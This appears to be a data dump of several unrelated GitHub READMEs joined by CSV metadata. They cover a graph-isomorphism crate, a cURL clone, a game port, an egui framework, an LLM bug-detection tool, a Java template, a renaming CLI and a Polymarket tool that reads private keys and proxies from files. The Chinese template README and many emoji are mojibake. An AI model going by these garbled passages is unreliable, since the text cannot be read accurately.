<img src=""images/icon.svg"" width=""128"" alt=""icon""/>

# `vf2`

### VF2 subgraph isomorphism algorithm in Rust

[![crates.io](https://img.shields.io/crates/v/vf2.svg)](https://crates.io/crates/vf2)
[![docs.rs](https://img.shields.io/docsrs/vf2)](https://docs.rs/vf2/latest/vf2)
[![](https://github.com/OwenTrokeBillard/vf2/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/OwenTrokeBillard/vf2/actions)

<br/>
</div>

This crate implements the VF2 subgraph isomorphism algorithm [1].
It can find
[graph isomorphisms](https://en.wikipedia.org/wiki/Graph_isomorphism),
[subgraph isomorphisms](https://en.wikipedia.org/wiki/Subgraph_isomorphism_problem),
and [induced subgraph isomorphisms](https://en.wikipedia.org/wiki/Induced_subgraph_isomorphism_problem).
Graphs can be directed or undirected.

# Features

- [x] Enumerate graph isomorphisms
- [x] Enumerate subgraph isomorphisms
- [x] Enumerate induced subgraph isomorphisms
- [x] Support directed graphs
- [x] Support undirected graphs
- [x] Support disconnected graphs
- [x] Support node labels
- [x] Support edge labels
- [x] Graph trait

# Motivation

Subgraph matching is the task of finding instances of a query graph within a larger data graph. It is useful when
searching for patterns in a graph structure, such as relationships in a social network. It is a fundamental problem in
graph theory with applications in pattern recognition, databases, security, and biochemistry.

Consider a network like LinkedIn where each node is a person, and each edge represents a connection. You are tasked with
finding cases where five software developers and a doctor all know each other. You can make a query graph with
developers and a doctor, and search for instances of that query in the larger network.

# What is a subgraph isomorphism?

A graph is a structure consisting of a set of objects where some pairs of objects are connected. A graph isomorphism is
a one-to-one correspondence between two graphs such that objects connected in one are also connected in the other.

### Graph isomorphism

For two graphs to be isomorphic, there must be a one-to-one correspondence between nodes such that neighbors in one are
also neighbors in the other. The query and data graphs in the following image are isomorphic.

![graph-isomorphism.svg](/images/graph-isomorphism.svg)

### Subgraph isomorphism

It is often desirable to find instances of one graph within another. To do this, we search for subgraph isomorphisms. A
subgraph isomorphism is when one graph is isomorphic to a subgraph of another. There are two subgraph isomorphisms in
the following image.

![subgraph-isomorphism.svg](/images/subgraph-isomorphism.svg)

### Induced subgraph isomorphism

An induced subgraph isomorphism is the same as a subgraph isomorphism except that the subgraph must be induced. Edges in
the data subgraph must also exist in the query graph.

![induced-subgraph-isomorphism.svg](/images/induced-subgraph-isomorphism.svg)

# Usage

Add `vf2` to your dependencies in **Cargo.toml**.

```toml
[dependencies]
vf2 = ""1.0""
```

Create your query and data graphs with [petgraph](https://github.com/petgraph/petgraph)
or any library that implements the `Graph` trait. Then, call one of the following
functions based on the problem type.

| Problem type                  | Call                                 |
|-------------------------------|--------------------------------------|
| Graph isomorphisms            | `vf2::isomorphisms`                  |
| Subgraph isomorphisms         | `vf2::subgraph_isomorphisms`         |
| Induced subgraph isomorphisms | `vf2::induced_subgraph_isomorphisms` |

These return a `Vf2Builder` with the algorithm configured.
Next, call one of the following on the builder to enumerate the isomorphisms.

| Desired output           | Call    |
|--------------------------|---------|
| First isomorphism        | `first` |
| Vector of isomorphisms   | `vec`   |
| Iterator of isomorphisms | `iter`  |

Filling a vector can consume a significant amount of memory.
Use the iterator to inspect isomorphisms as they are found.
For the best performance, call `next_ref`
on the iterator
instead of `next`
to avoid cloning each isomorphism.

You can configure the node and edge equality functions on the builder
with `node_eq` and `edge_eq`,
respectively.

# Example

This example shows how to find subgraph isomorphisms.

```rust
use petgraph::data::{Element, FromElements};
use petgraph::graph::DiGraph;

fn main() {
    // Create query graph.
    let query = DiGraph::<i32, ()>::from_elements([
        Element::Node { weight: 0 },
        Element::Node { weight: 1 },
        Element::Edge { source: 0, target: 1, weight: () },
    ]);

    // Create data graph.
    let data = DiGraph::<i32, ()>::from_elements([
        Element::Node { weight: 0 },
        Element::Node { weight: 1 },
        Element::Node { weight: 2 },
        Element::Edge { source: 0, target: 1, weight: () },
        Element::Edge { source: 1, target: 2, weight: () },
    ]);

    // Find subgraph isomorphisms.
    let isomorphisms = vf2::subgraph_isomorphisms(&query, &data).vec();
    assert_eq!(isomorphisms, vec![vec![0, 1], vec![1, 2]]);
}
```

# Remaining work

The crate is feature complete. The following will improve performance.

- [ ] Implement VF2 cutting rules
- [ ] Implement VF2++ (only VF2 implemented so far)

# References

[1] L. P. Cordella, P. Foggia, C. Sansone, and M. Vento,
‚ÄúA (sub)graph isomorphism algorithm for matching large graphs,‚Äù
IEEE Transactions on Pattern Analysis and Machine Intelligence, vol. 26, no. 10, pp. 1367‚Äì1372,
Oct. 2004, doi: https://doi.org/10.1109/tpami.2004.75.

[2] A. J√ºttner and P. Madarasi,
‚ÄúVF2++‚ÄîAn improved subgraph isomorphism algorithm,‚Äù
Discrete Applied Mathematics, vol. 242, pp. 69‚Äì81,
Jun. 2018, doi: https://doi.org/10.1016/j.dam.2018.02.018.
",0,0,1,Apache-2.0,ci.yml,0.0
Kei-K23/curlio,main,"# Curlio - A cURL Implementation in Rust

`curlio` is a command-line tool built in `Rust` that mimics the functionality of `cURL`. It allows you to send HTTP requests to `URLs` with support for various HTTP methods, custom headers, request body data (including JSON and multipart form data with file uploads), and more. The tool also includes options for verbosity, silence, response storage, Download file, zip, images, videos and retry mechanisms.

## Features

- Supports common HTTP methods like `GET`, `POST`, `PUT`, and `DELETE`.
- Allows custom headers to be passed in JSON format.
- Sends request body data in various formats.
- Supports multipart form data including file uploading.
- Optional verbose mode to show detailed request and response information.
- Silent mode to suppress output.
- Option to store response data to a file.
- Timeout configuration.
- Retry mechanism for handling failed requests.
- Basic and Bearer authentication support.
- Download file, zip, images and videos using `curlio` with nice informatics loading indicator.

## Installation

This CLI is published with `Cargo`. You can easily download and update with `cargo install curlio` command and accept the binary from everywhere.

```bash
cargo install curlio
```

## Local setup

To use `curlio`, you need to have Rust installed on your system. You can install Rust from [here](https://www.rust-lang.org/tools/install).

Once Rust is installed, clone the repository and build the project:

```bash
git clone https://github.com/Kei-K23/curlio.git
cd curlio
cargo build --release
```

## Usage

Run the executable with the necessary arguments to send HTTP requests. Below are the available options:

```bash
curlio 0.4.3
Kei-K23
curlio is a cURL implementation in Rust

USAGE:
    curlio [OPTIONS] <url>

ARGS:
    <url>    The URL to send the request to

Options:
  -X, --request <method>         HTTP method (GET, POST, etc.) [default: GET]
  -d, --data <data>              Sends the specified data in a POST request
  -F, --form <form>              Sends multiple form data using JSON structured format (use file path for file uploading)
  -H, --header <header>          Add headers to the request
  -v, --verbose <verbose>        Show detail information about request and response <f for False/ t for True> [default: f]
  -s, --silent <silent>          Suppress all output <f for False/ t for True> [default: f]
  -t, --timeout <timeout>        Set a timeout for the request (in seconds)
  -r, --retry <retry>            Number of retry attempts in case of failure
  -S, --store <store>            Store the response data to file
  -A, --user-agent <user_agent>  Specify custom User-Agent
  -u, --user <basic_auth>        Provide basic authentication in the format `username:password`
  -L, --location <follow>        Follow HTTP redirects <f for False/ t for True> [default: f]
      --proxy <proxy>            Use HTTP/HTTPS proxy
  -D, --download <download>      Download file and save them in your file system
      --cookies <cookies>        Attach cookies to the request
  -h, --help                     Print help
  -V, --version                  Print version
```

## Examples

### Main Options

1. Simple GET request:

```bash
curlio http://example.com
```

2. POST request with data:

```bash
curlio -X POST -d '{""key"":""value""}' http://example.com
```

3. GET request with custom headers:

```bash
curlio -H '{""Content-Type"": ""application/json""}' http://example.com
```

4. GET request with a timeout:

```bash
curlio -t 5 http://example.com
```

5. Verbose mode:

```bash
curlio -v t http://example.com
```

6. Retry on failure:

```bash
curlio -r 3 http://example.com
```

7. Store the response data to file:

```bash
curlio ""https://fakestoreapi.com/products"" -X GET -H '{""Accept"": ""application/json""}' -S ""products.json""
```

8. Basic Authentication:

```bash
curlio -u ""username:password"" http://example.com
```

9. Bearer Token Authentication:

```bash
curlio -H '{""Authorization"": ""Bearer your_token_here""}' http://example.com
```

10. Cookies file support. Add cookies values to request header:

```bash

# Example cookies json file (name what ever you want just to be sure to be .json file)
# [
#     {
#         ""name"": ""session-id"",
#         ""value"": ""235-3769708-3150250""
#     },
#     {
#         ""name"": ""ubid-main"",
#         ""value"": ""134-3687901-5787569""
#     },
#     {
#         ""name"": ""session-token"",
#         ""value"": ""\""JKASDIUivnisduhfisd213biHUKLFbnoisd2344325\""""
#     }
# ]

curlio 'https://fakestoreapi.com/products' -X GET -H '{""Accept"": ""application/json""}' --cookies cookies.json
```

11. Download files, zips, images, videos as you wish

```bash
curlio ""https://file-examples.net/wp-content/uploads/2024/02/SampleTextFile_1MB.txt"" -D test.txt

# Example Output
Starting download of 1023385 bytes...
Progress: [#############################                     ] 58.20% (595608/1023385)
```

### Error Handling

If the request fails and no retries are specified, an error message will be displayed in the terminal:

```bash
Request failed: <Error message>
```

If retries are enabled, it will retry the request up to the specified count, and you will see output like:

```bash
Attempt 1 failed, retrying... (<Error message>)
```

## Todo

- [ ] Make binary for other installer methods.
- [ ] Add test cases to cover all use cases.
- [ ] Additional features and improvements.

## License¬†

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details.

## Contribution

All contributions are welcome. Please open issues or make PR for error, bug, and adding new features.
",0,0,3,MIT,,2.0
urrickhunt/drugwars-rust,main,"### 40th Anniversary Drugwars in Rust ü¶Ä

![drugs](https://github.com/user-attachments/assets/a646b12e-1aed-4d20-8107-9206f72d0411)

Drugwars, the classic text-based game, is back & rewritten in Rust for its 40th Anniversary. 

This cross-platform version stays true to the original experience, featuring familiar gameplay & updated terminal compatibility.

Single Key Commands like the original ensure smooth gameplay with quick input handling.

### Installation

`cargo install drugwars-rust`

### Building

`git clone https://github.com/urrickhunt/drugwars-rust`

- normal release

`cargo build --release`

- lto release

`cargo build --profile release-lto`

- normal install

`cargo install --path .`

- lto install

`cargo install --path . --profile release-lto`

- run

`drugwars-rust`

- run on git bash mintty

`winpty drugwars-rust`

![Mofo](https://github.com/user-attachments/assets/225ca1da-c7bc-47ff-8fab-1aca4e394134)

### Local High Scores Added

![high](https://github.com/user-attachments/assets/32dae56d-e06b-4ce1-b089-979301d24068)
",4,0,1,MIT,,0.0
DougAnderson444/rdx,main,"# RDX

> Rhai markDown egui eXtensions (RDX)

> Rust Developer eXperience (RDX)

> Real gooD eXperiment

- ü¶Ä Pure Rust (no JavaScript)
- ü•á All Platforms (Web, Desktop)
- ü¶ï Extensible - Bring your own eXtensions, or run other's privately
- ü¶∫ Safe - FULL STACK code safely in a WebAssembly 
- üöÄ Fast - WebAssembly is fast, and Rhai is Fast 
- üé® Beautiful - eGUI is beautiful, and Rhai is simple 
- üì¶ Bundled - Everything you need in one package 
- üåê Web - Deploy to the web with Trunk 
- üì± Mobile - Coming soon 

## Why?

Because we need a way to encapsulate full stack apps into WebAssembly, so they can be run in a trustless way.

## What is RDX?

RDX is a combination of: 

1. Rhai (for control flow logic) and 
2. üÜï egui markdown (for User Interface). 

For [example](./examples/counter/src/lib.rs), It looks something like this:

```rhai 
// call the system function `render` on the template with the ctx from scope

// rhai script controls the flow of logic on what to show

if !is_def_var(""count"") || count == ""0"" {

    // the render function returns a string of RDX
    // render is provided by the rhai scope by default
    render(ctx, `
        <Vertical>
            <Button on_click=increment()>Increment</Button>
            <Button on_click=decrement()>Decrement</Button>
            <Label>Click to Start counting!</Label>
        </Vertical>
    `)

} else {

    // alternate RDX if count is not 0 
    // the {{count}} is a variable stored in rhai scope
    render(ctx, `
        <Vertical>
            <Button on_click=increment()>Increment</Button>
            <Button on_click=decrement()>Decrement</Button>
            <Label>Count is: {{count}}</Label>
        </Vertical>
    `)

}
```

The `increment()` and `decrement()` functions are provided by WebAssembly exported functions. These functions emit a `count` variable that is stored in the Rhai scope, then displayed back in the gui.

Bundle RDX scripts into WebAssembly then run them as eframe components, natively or in the browser.

eframe template experiment to see if I can parse an RDX format into eframe.

The goal is for this to be the simplest way to get started writing a eGUI app in Rust.

You can compile your app natively or for the web, and share it using Github Pages.

## Getting started

Build a component in either pure Rhai or Rhai + Rust compiled to WASM.

1. Get an eframe environment set up using [eframe_template](https://github.com/emilk/eframe_template) so you can test your app while you develop.
2. Develop a [Wasm Component](https://component-model.bytecodealliance.org/) using [cargo-component](https://github.com/bytecodealliance/cargo-component). Create it using `cargo component new --lib <your_plugin_name>`. I like to add a `rustfmt.toml` file with `ignore = [""src/bindings.rs""]` becaus the generated bindings fail the format tests.

### Testing locally

Make sure you have [`just`](https://just.systems/man/en/) installed and are using the latest version of stable rust by running `rustup update`.

`just run`

#### Dependencies

On Linux you may need to first run:

`sudo apt-get install libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev libxkbcommon-dev libssl-dev`

On Fedora Rawhide you need to run:

`dnf install clang clang-devel clang-tools-extra libxkbcommon-devel pkg-config openssl-devel libxcb-devel gtk3-devel atk fontconfig-devel`

### Web Locally

You can compile your app to [WASM](https://en.wikipedia.org/wiki/WebAssembly) and publish it as a web page.

We use [Trunk](https://trunkrs.dev/) to build for web target.
1. Install the required target with `rustup target add wasm32-unknown-unknown`.
2. Install Trunk with `cargo install --locked trunk`.
3. Run `trunk serve` to build and serve on `http://127.0.0.1:8080`. Trunk will rebuild automatically if you edit the project.
4. Open `http://127.0.0.1:8080/index.html#dev` in a browser. See the warning below.

> `assets/sw.js` script will try to cache our app, and loads the cached version when it cannot connect to server allowing your app to work offline (like PWA).
> appending `#dev` to `index.html` will skip this caching, allowing us to load the latest builds during development.

### Web Deploy
1. Just run `trunk build --release`.
2. It will generate a `dist` directory as a ""static html"" website
3. Upload the `dist` directory to any of the numerous free hosting websites including [GitHub Pages](https://docs.github.com/en/free-pro-team@latest/github/working-with-github-pages/configuring-a-publishing-source-for-your-github-pages-site).
4. we already provide a workflow that auto-deploys our app to GitHub pages if you enable it.
> To enable Github Pages, you need to go to Repository -> Settings -> Pages -> Source -> set to `gh-pages` branch and `/` (root).
>
> If `gh-pages` is not available in `Source`, just create and push a branch called `gh-pages` and it should be available.
>
> If you renamed the `main` branch to something else (say you re-initialized the repository with `master` as the initial branch), be sure to edit the github workflows `.github/workflows/pages.yml` file to reflect the change
> ```yml
> on:
>   push:
>     branches:
>       - <branch name>
> ```

You can test the template app at <https://emilk.github.io/eframe_template/>.

## Updating egui

As of 2023, egui is in active development with frequent releases with breaking changes. [eframe_template](https://github.com/emilk/eframe_template/) will be updated in lock-step to always use the latest version of egui.

When updating `egui` and `eframe` it is recommended you do so one version at the time, and read about the changes in [the egui changelog](https://github.com/emilk/egui/blob/master/CHANGELOG.md) and [eframe changelog](https://github.com/emilk/egui/blob/master/crates/eframe/CHANGELOG.md).
",1,0,3,Apache-2.0,"pages.yml,rust.yml,typos.yml",0.0
chengpeng-wang/LLMSAN,main,"# LLMSAN: Sanitizing Large Language Models in Bug Detection with Data-Flow

LLMSAN is a tool for prompting-based bug detection. Equipped with the sanitization technique, LLMSAN can recognize false positives in the reported bugs without introducing huge additional token costs.

## Structure of Project

```
‚îú‚îÄ‚îÄ README.md                              # README 
‚îú‚îÄ‚îÄ benchmark                              # Dataset
‚îÇ   ‚îú‚îÄ‚îÄ Java                               # Java programs
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ juliet-test-suite-APT          # Absolute Path Traversal
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ juliet-test-suite-CI           # OS Command Injection
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ juliet-test-suite-DBZ          # Divide-by-Zero
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ juliet-test-suite-NPD          # Null Pointer Dereference
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ juliet-test-suite-XSS          # Cross-Site Scripting
‚îÇ   ‚îî‚îÄ‚îÄ case                               # Evaluation cases
‚îú‚îÄ‚îÄ lib                                    # Library
‚îÇ   ‚îî‚îÄ‚îÄ build.py                           # Build tree-sitter locally
‚îú‚îÄ‚îÄ log                                    # Output of LLMSAN and baselines
‚îÇ   ‚îú‚îÄ‚îÄ baseline                           # Output of baselines
‚îÇ   ‚îú‚îÄ‚îÄ llmsan                             # Output of LLMSAN
‚îÇ   ‚îú‚îÄ‚îÄ batchreport.py                     # Summarize analysis reports
‚îú‚îÄ‚îÄ requirements.txt                       # requirement file
‚îî‚îÄ‚îÄ src                                    # Source code directory
 ‚îú‚îÄ‚îÄ batchrun.py                           # Entry of analysis
 ‚îú‚îÄ‚îÄ data                                  # Data transform directory
 ‚îÇ   ‚îî‚îÄ‚îÄ transform.py                      # Prepare data by obfuscation
 ‚îú‚îÄ‚îÄ model                                 # LLM model related
 ‚îÇ   ‚îú‚îÄ‚îÄ detector.py                       # End-to-end CoT prompting-based detection
 ‚îÇ   ‚îú‚îÄ‚îÄ llm.py                            # LLM module
 ‚îÇ   ‚îî‚îÄ‚îÄ utils.py                          # Basic setting of LLMs
 ‚îú‚îÄ‚îÄ parser                                # Parsing related
 ‚îÇ   ‚îî‚îÄ‚îÄ parser.py                         # Parse LLM output
 ‚îú‚îÄ‚îÄ pipeline.py                           # Pipelines of LLMSAN and baselines
 ‚îú‚îÄ‚îÄ prompt                                # Prompt templates of different bug types
 ‚îî‚îÄ‚îÄ sanitizer                             # Sanitizer related
 ‚îú‚îÄ‚îÄ analyzer.py                           # Program parsing-based analysis
 ‚îî‚îÄ‚îÄ passes.py                             # Implementation of four sanitizers
```

## Installation

1. Clone the repository:
    ```shell
    git clone https://github.com/chengpeng-wang/LLMSAN.git
    cd LLMSAN
    ```

2. Install the required dependencies:
    ```shell
    pip install -r requirements.txt
    ```

3. Ensure you have the Tree-sitter library and language bindings installed:
    ```shell
    cd lib
    python build.py
    ```

4. Configure the keys:
    ```shell
    export OPENAI_API_KEY=sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    ```

    Similarly, the other two keys can be set as follows:
    ```shell
    export REPLICATE_API_TOKEN=xxxxxx
    export GEMINI_KEY=xxxxxx
    ```

## Quick Start

1. Analyze a demo case using LLMSAN

    We can run the following commands to detect the XSS bug in the file `CWE80_XSS__CWE182_Servlet_database_66.java` as a demo.

    ```shell
    cd src
    python batchrun.py \
        --bug-type=xss \
        --detection-model=gpt-3.5-turbo \
        --sanitization-model=gpt-3.5-turbo \
        --analysis-mode=lazy \
        --project-mode=single \
        --engine=llmsan \
        -functionality-sanitize \
        -reachability-sanitize \
        --global-temperature=0.0 \
        --self-consistency-k=1
    ```

    If you want to detect all the XSS bugs, change `--project-mode=single` to `--project-mode=all`.

    If you want to detect kinds of bugs, change `xss` in `--bug-type=xss` to other bug types, which can be `apt`, `ci`, `npd`, and `dbz`.

    Then, you can summarize the analysis reports by running the command. Remember that you should make the values of the common options of batchrun and batchreport the same.

    ```shell
    cd log
    python batchreport.py \
        --bug-type=xss \
        --detection-model=gpt-3.5-turbo \
        --sanitization-model=gpt-3.5-turbo \
        --project-mode=single \
        --engine=llmsan \
        --global-temperature=0.0 \
        --self-consistency-k=1
    ```

    The summary of the analysis will be dumped to `report.json` in the directory `log`. In each item, the following dictionary shows the details of the detection and sanitization: 

    ```json
    ""result"": {
        ""type_sanitize"": 1,
        ""functionality_sanitize"": 1,
        ""order_sanitize"": 1,
        ""reachability_sanitize"": 1,
        ""total"": 1,
        ""final"": 1
    }
    ```

    The values of ""xxx_sanitize"" indicate whether the data-flow path violates any syntactic or semantic property. If the value is 1, the property is not violated. If the value of ""final"" is 1, the bug report is recognized as true bug as all the sanitizers do not discover any violations.

  
2. Analyze a demo case using baselines
   
    You can execute the following commands to run the baseline SC-CoT-Check upon the file `CWE80_XSS__CWE182_Servlet_database_66.java` as a demo, where `self-consistency-k` is set to 5 and the temperature is 0.5.

    ```shell
    cd src
    python batchrun.py \
        --bug-type=xss \
        --detection-model=gpt-3.5-turbo \
        --sanitization-model=gpt-3.5-turbo \
        --analysis-mode=lazy \
        --project-mode=single \
        --engine=baseline \
        --global-temperature=0.5 \
        -step-by-step-check \
        --self-consistency-k=5
    ```

    You can remove `-step-by-step-check` to disable CoT strategy and set `self-consistency-k` to 1 to disable self-consistency.

    Similarly, if you want to get the summarized report of a baseline, just run 

    ```shell
    cd log
    python batchreport.py \
        --bug-type=xss \
        --detection-model=gpt-3.5-turbo \
        --sanitization-model=gpt-3.5-turbo \
        --project-mode=single \
        --engine=baseline \
        -step-by-step-check \
        --global-temperature=0.5 \
        --self-consistency-k=5
    ```

    In the generated file `log/report.json`, if the boolean value attached to each data-flow path is true, the data-flow path is recognized as the true bug.

    Attention: You need to run LLMSAN first to obtain the initial detection result before running the baselines checking the detection results.


## Options in LLMSAN

You can configure the analysis by specifying the proper options. Here are the descriptions of the options in LLMSAN

- `--bug-type`: Specify the bug type, including `apt`, `ci`, `dbz`, `npd`, and `xss`.
- `--detection-model`: Specify the LLM model for initial detection (e.g., `gpt-3.5-turbo`).
- `--sanitization-model`: Specify the LLM model for sanitization (e.g., `gpt-3.5-turbo`). Please note that the detection model and sanitization model are not necessarily the same, although we set them to be the same in our work.
- `--analysis-mode`: Specify the analysis mode (lazy or eager). In the lazy mode, the initial bug detection would be skipped if the case has been analyzed before. In the eager mode, the detection phase is always enabled.
- `--project-mode`: Specify the project mode (single or all). In the single-analysis mode, run LLMSAN and baselines on single files as a demo. In the all-analysis mode, all the experimental subjects are analyzed.
- `--engine`: Specify the analyzer (llmsan or baseline).
- `-functionality-sanitize`: Enable functionality sanitization.
- `-reachability-sanitize`: Enable reachability sanitization.
- `-step-by-step-check`: Enable CoT
- `--global-temperature`: Specify the temperature for the model. The temperature of LLMSAN is always set to 0.0. 
- `--self-consistency-k`: Specify the number of self-consistency iterations. The self-consistency-k value of LLMSAN is always set to 1

## Remark on Dataset

To avoid the leakage of ground truth to LLMs, we obfuscate the code in the Juliet Test Suite. The details of the obfuscation can be found in the function `obfuscate` in the file `src/data/transform.py`. Also, we concatenate multiple Java files belonging to the same test case into a single file for convenience in prompting, even though the resulting file may not be compilable.

## More Programming Languages

LLMSAN is language-agnostic. To migrate the current implementations to other programming languages or extract more syntactic facts, please refer to the grammar files in the corresponding Tree-sitter libraries and refactor the code in `sanitizer/analyzer.py`. Basically, you only need to change the node types when invoking `find_nodes`.

Here are the links to grammar files in Tree-sitter libraries targeting mainstream programming languages:

- C: https://github.com/tree-sitter/tree-sitter-c/blob/master/src/grammar.json
- C++: https://github.com/tree-sitter/tree-sitter-cpp/blob/master/src/grammar.json
- Java: https://github.com/tree-sitter/tree-sitter-java/blob/master/src/grammar.json
- Python: https://github.com/tree-sitter/tree-sitter-python/blob/master/src/grammar.json
- JavaScript: https://github.com/tree-sitter/tree-sitter-javascript/blob/master/src/grammar.json

## Contributing

Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.

## Contact

For any questions or suggestions, please contact [wang6590@purdue.edu](mailto:wang6590@purdue.edu) or [stephenw.wangcp@gmail.com](mailto:stephenw.wangcp@gmail.com).",0,1,1,,,0.0
macdao/hands-on-clean-architecture-template,main,"# HoCAT üêæ

HoCATÔºåHands-on Clean Architecture TemplateÔºåÂç≥ÂèØËêΩÂú∞ÁöÑÊï¥Ê¥ÅÊû∂ÊûÑÊ®°Êùø„ÄÇÊó®Âú®Êàê‰∏∫È°πÁõÆÁöÑ‰ª£Á†ÅÂ∫ìÊ®°ÊùøÈÄâÈ°π‰πã‰∏Ä„ÄÇ

‰ΩøÁî®‰∫ÜÂΩìÂâçÊúÄÊñ∞ÁöÑÊäÄÊúØÂíåÂ∑•ÂÖ∑„ÄÅÊé®ËçêÁöÑ‰ΩøÁî®/ÈÖçÁΩÆÊñπÂºèÂíåÊúÄ‰Ω≥ÂÆûË∑µ„ÄÇ

## È°πÁõÆËØ¥Êòé

Êü•ÁúãÊñáÊ°£[EXPLANATION.md](docs/EXPLANATION.md)„ÄÇ

## È°πÁõÆ‰ΩøÁî®

- ÂâçÁΩÆÊù°‰ª∂
  - ÂÆâË£ÖJava 21„ÄÇ
  - ÂÆâË£ÖDockerÂíåDocker Compose„ÄÇ

- ÊµãËØïÊûÑÂª∫

  ‰ΩøÁî®`./gradlew build`ÊûÑÂª∫È°πÁõÆ„ÄÇ

- Êú¨Âú∞ËøêË°å

  ‰ΩøÁî®`./gradlew bootRun`ËøêË°åÊú¨Âú∞ÁéØÂ¢É„ÄÇ

  Â¶ÇÊûúÈúÄË¶ÅÂêØÂä®Êú¨Âú∞‰∏âÊñπÊúçÂä°ÔºåËøêË°å`scripts/run-stub-runner-server configuration/src/test/resources/contracts/client 16581`

- ÊâìÂåÖ

  ‰ΩøÁî®`./gradlew bootBuildImage`ÊûÑÂª∫DockerÈïúÂÉè„ÄÇËøôÂü∫‰∫éSpring BootÁöÑGradleÊèí‰ª∂„ÄÇ

## ÊäÄÊúØÊ†à

- Âü∫Á°Ä
  - Java (21 LTS)
  - Spring Boot (3.4.0)
  - Spring Bean Validation
  - Lombok
  - JUnit 5
  - AssertJ
  - Mockito
  - Docker & Docker Compose
- ÊûÑÂª∫
  - Gradle
  - JaCoCo
  - Spotless
- Web
  - Spring Web MVC
  - Spring Cloud Contract Verifier
  - Spring Security
  - Spring Cloud Contract Stub Runner (for consumer)
- Persistence
  - Spring Data JPA
  - MySQL (8 LTS)
  - Flyway
  - Spring Boot Docker Compose Support
- Client
  - Spring RestClient
  - Spring Cloud Contract Stub Runner
- ÊñáÊ°£
  - Markdown
  - PlantUML

## Êï∞ÊçÆÂ∫ì

‰∏∫ÈÅøÂÖçÁ´ØÂè£ÂÜ≤Á™ÅÔºåÈááÁî®Âä®ÊÄÅÁ´ØÂè£ÔºåÈúÄË¶ÅÈÄöËøáDocker ComposeÊü•ÁúãÊï∞ÊçÆÂ∫ìÁ´ØÂè£„ÄÇ

- Êü•ÁúãËá™Âä®ÂåñÊµãËØïÊï∞ÊçÆÂ∫ì

  Âú®`adapter/persistence`ÁõÆÂΩï‰∏ãÊâßË°å`docker compose ps`ÔºåÊü•Áúã`PORTS`„ÄÇ

- Êü•ÁúãÊú¨Âú∞ËøêË°åÊï∞ÊçÆÂ∫ì

  Âú®`configuration`ÁõÆÂΩï‰∏ãÊâßË°å`docker compose ps`ÔºåÊü•Áúã`PORTS`„ÄÇ

## Â•ëÁ∫¶Ê∂àË¥πËÄÖÔºà‰æãÂ¶ÇÂâçÁ´ØÔºâËá™Âä®ÂåñÊµãËØïÊîØÊåÅ

ËøêË°åStub Runner ServerÔºåÊâßË°å`scripts/run-stub-runner-server`„ÄÇ

- ‰ΩøÁî®adapter/webÁöÑÂ•ëÁ∫¶„ÄÇ
- ÈúÄË¶Å‰ΩøÁî®Java 1.8ÊàñËÄÖ11Ôºå‰∏çÊîØÊåÅJava 17ÊàñÊõ¥È´òÁâàÊú¨„ÄÇ
- ÈªòËÆ§Á´ØÂè£ÊòØ16580„ÄÇ

## È°πÁõÆÁªìÊûÑ

```plantuml
@startuml
skinparam defaultFontName Fira Code, Monospaced

[application] --> [domain]
[adapter:web] --> [application]
[adapter:persistence] --> [application]
[adapter:client] --> [application]
[adapter:...] --> [application]
[configuration] --> [adapter:web]
[configuration] --> [adapter:persistence]
[configuration] --> [adapter:client]
[configuration] --> [adapter:...]

@enduml
```

## IDE‰ΩøÁî®

- FormatterÔºöÂÆâË£ÖIDEÊèí‰ª∂[Spotless](https://github.com/diffplug/spotless)„ÄÇ

## ËΩªÈáèÁ∫ßÁâàÊú¨

[HoCATLing](https://github.com/macdao/hands-on-clean-architecture-template-ling)Ôºå‰∏çÊãÜÂàÜÂ§ö‰∏™Áã¨Á´ãÁöÑÁªÑ‰ª∂ÔºåÈÄÇÁî®‰∫éÂ∞èÂûãÈ°πÁõÆ„ÄÇ",0,0,1,,,0.0
trinhminhtriet/filerefine,master,"# FileRefine

```text
 _____  _  _        ____          __  _              
|  ___|(_)| |  ___ |  _ \   ___  / _|(_) _ __    ___ 
| |_   | || | / _ \| |_) | / _ \| |_ | || '_ \  / _ \
|  _|  | || ||  __/|  _ < |  __/|  _|| || | | ||  __/
|_|    |_||_| \___||_| \_\ \___||_|  |_||_| |_| \___|
```

üßπ FileRefine is a Rust-based CLI tool that renames files in a directory to remove unwanted or problematic characters from filenames.

## üöÄ Installation

To install `filerefine`, simply clone the repository and follow the instructions below:

```sh
git clone https://github.com/trinhminhtriet/filerefine.git
cd filerefine

cargo install --path .

filerefine --do my_path
```

Running the below command will globally install the `filerefine` binary.

```bash
cargo install filerefine
```

> By default, filerefine will only print the names that would be renamed. Use the `--do` or `-d` option to actually rename the files.

## üí° Options

| Option                | Description                  |
| --------------------- | ---------------------------- |
| `-v`, `--version`     | Prints version information   |
| `-d`, `--do`          | Do the actions               |
| `-q`, `--quiet`       | No output                    |
| `-j`, `--json`        | Output as JSON               |
| `-p`, `--json-pretty` | Output as JSON (prettified)  |
| `-e`, `--json-error`  | Output as JSON (only errors) |

## ü§ù How to contribute

We welcome contributions!

- Fork this repository;
- Create a branch with your feature: `git checkout -b my-feature`;
- Commit your changes: `git commit -m ""feat: my new feature""`;
- Push to your branch: `git push origin my-feature`.

Once your pull request has been merged, you can delete your branch.

## üìù License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Information

- [CHANGELOG](CHANGELOG.md)
",2,0,1,MIT,"publish.yml,release.yml",0.0
Fragment-Software/polymarket-eye,main,"# Polymarket Eye

## English

### Socials

Telegram channel: [https://t.me/fragment_software](https://t.me/fragment_software)

Telegram chat: [https://t.me/fragment_software_chat](https://t.me/fragment_software_chat)

### Installation

#### Prerequisites

- **Rust** : Ensure you have Rust installed. You can download and install Rust from [https://www.rust-lang.org/tools/install]().

### Build

Clone the repository and build the project:

```
git clone https://github.com/Fragment-Software/polymarket-eye.git
cd polymarket-eye
cargo build --release
```

### Configuration

Before running the software, configure the necessary files:

1. **private_keys.txt** : Add your private keys to `data/private_keys.txt`.
2. **proxies.txt** : Add your proxies to `data/proxies.txt`.

### Running

Execute the built binary:

`cargo run --release`

### Output

